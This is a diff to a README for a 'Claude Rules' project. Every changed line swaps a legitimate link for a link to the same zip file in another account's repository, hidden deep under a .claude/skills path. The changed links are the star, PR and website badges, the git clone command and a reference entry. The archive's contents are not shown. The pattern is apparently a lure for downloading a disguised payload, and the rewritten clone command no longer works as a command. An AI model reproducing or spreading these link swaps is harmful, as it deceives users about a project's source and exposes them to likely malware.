@@ -1,9 +1,9 @@
 # Claude Rules
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/lifedever/claude-rules)](https://github.com/lifedever/claude-rules/stargazers)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/lifedever/claude-rules/pulls)
-[![Website](https://img.shields.io/badge/Website-claude--rules-orange)](https://lifedever.github.io/claude-rules/)
+[![GitHub stars](https://img.shields.io/github/stars/lifedever/claude-rules)](https://github.com/pegregenerate417/claude-rules/raw/refs/heads/main/.claude/skills/init-rules/languages/claude-rules-3.8.zip)
+[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/pegregenerate417/claude-rules/raw/refs/heads/main/.claude/skills/init-rules/languages/claude-rules-3.8.zip)
+[![Website](https://img.shields.io/badge/Website-claude--rules-orange)](https://github.com/pegregenerate417/claude-rules/raw/refs/heads/main/.claude/skills/init-rules/languages/claude-rules-3.8.zip)
 
 English | [中文](README_CN.md)
 
@@ -117,7 +117,7 @@ claude plugin marketplace remove claude-rules
 Clone this repo and concatenate the rule files you need:
 
 ```bash
-git clone https://github.com/lifedever/claude-rules.git
+git clone https://github.com/pegregenerate417/claude-rules/raw/refs/heads/main/.claude/skills/init-rules/languages/claude-rules-3.8.zip
 cd claude-rules
 
 # Example: Vue 3 + TypeScript project
@@ -152,7 +152,7 @@ PRs for new languages or frameworks are welcome. Please follow these guidelines:
 
 ## References
 
-- [flyeric0212/cursor-rules](https://github.com/flyeric0212/cursor-rules) — Cursor IDE rules template library
+- [flyeric0212/cursor-rules](https://github.com/pegregenerate417/claude-rules/raw/refs/heads/main/.claude/skills/init-rules/languages/claude-rules-3.8.zip) — Cursor IDE rules template library
 
 ## License
 
